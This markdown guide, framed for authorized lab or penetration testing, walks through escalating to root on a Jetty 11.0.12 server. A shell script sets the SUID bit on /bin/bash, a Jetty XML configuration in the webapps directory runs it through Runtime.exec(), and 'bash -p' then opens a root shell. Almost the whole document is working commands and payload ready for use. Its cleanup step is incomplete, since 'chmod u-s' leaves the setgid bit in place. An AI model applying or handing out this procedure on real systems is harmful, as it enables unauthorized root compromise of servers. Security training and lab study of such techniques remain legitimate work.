# Privilege Escalation to Root via Jetty 11.0.12

> **Technique:** Jetty XML configuration execution\
> **Target:** Jetty 11.0.12\
> **Goal:** Obtain a root shell by setting the SUID bit on `/bin/bash`\
> **Context:** Authorized lab or penetration-testing environment

------------------------------------------------------------------------

## 1. Overview

This technique abuses a Jetty XML configuration file to execute a system
command through Java's `Runtime.exec()`.

The command creates a SUID-enabled Bash binary. If the Jetty process
loads the configuration with root privileges, the SUID bit can allow a
local user to start Bash with elevated privileges.

## 2. Create the Root Script

Move to Jetty's web application directory:

``` bash
cd /opt/jetty/jetty-base/webapps/
```

Create a script that sets the SUID bit on `/bin/bash`:

``` bash
echo "chmod +s /bin/bash" > /tmp/root.sh
chmod +x /tmp/root.sh
```

## 3. Create the Jetty XML Configuration

Create or edit `shell.xml`:

``` bash
nano shell.xml
```

Insert the following configuration:

``` xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
    <Call class="java.lang.Runtime" name="getRuntime">
        <Call name="exec">
            <Arg>
                <Array type="String">
                    <Item>/tmp/root.sh</Item>
                </Array>
            </Arg>
        </Call>
    </Call>
</Configure>
```

Save the file.

## 4. Obtain the Root Shell

After the XML configuration has been loaded and the command has
executed, start Bash in privileged mode:

``` bash
bash -p
```

Verify the current identity:

``` bash
id
```

A successful privilege escalation should show `uid=0(root)`.

## 5. Verification

Check the SUID permission on Bash:

``` bash
ls -l /bin/bash
```

The permissions should include an `s`, for example:

``` text
-rwsr-sr-x
```

Then verify the effective identity:

``` bash
bash -p -c 'id'
```

## 6. Notes

-   This relies on Jetty loading the XML configuration and executing it
    with sufficient privileges.
-   The XML file's presence alone does not prove that it was loaded.
    Confirm the application/server's configuration-loading behavior in
    the lab.
-   The exact trigger and timing depend on the Jetty deployment and
    configuration.
-   Use this procedure only on systems where you have explicit
    authorization.

## 7. Cleanup

After the test, remove the SUID bit and temporary files:

``` bash
chmod u-s /bin/bash
rm -f /tmp/root.sh
rm -f /opt/jetty/jetty-base/webapps/shell.xml
```

Confirm that the SUID bit is no longer set:

``` bash
ls -l /bin/bash
```
